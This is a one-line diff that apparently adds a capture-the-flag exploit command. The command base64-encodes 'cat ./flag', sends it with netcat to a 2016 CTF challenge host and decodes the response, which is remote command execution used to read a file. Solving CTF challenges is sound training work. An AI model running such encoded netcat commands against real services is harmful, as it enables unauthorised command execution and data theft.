@@ -1,0 +1,1 @@
+echo "cat ./flag" | base64 | nc ctf2016.the-playground.dk 13004 | base64 -d
